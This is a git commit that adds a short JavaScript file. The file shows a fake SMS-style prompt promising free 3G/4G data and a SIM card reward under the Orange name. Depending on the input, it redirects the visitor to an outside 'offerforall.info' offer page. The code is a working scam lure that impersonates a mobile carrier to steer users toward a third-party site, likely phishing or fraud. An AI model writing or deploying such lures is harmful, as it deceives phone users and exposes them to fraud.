7f57097f47d594c923562ddf50bc70da39ca0dd5
harryjohnson86 <mfonjohnson86@gmail.com>
2025-01-10 22:54:44 -0800

    Create orange-20godata.js

---
+++ orange-20godata.js
@@ -0,0 +1,5 @@
+var password = '20 Go de données gratuites'
+password=prompt('SMS: Congratulations Your Number is Eligible to receive 10GB Free Data 3G or 4G UPGRADE SIM CARD REWARD, Kindly Press OK to ACTIVATE. ','20 Go de données gratuites');
+if (password != '20 Go de données gratuites') {
+location.href='https://offerforall.info/orange-20godata.html';
+}
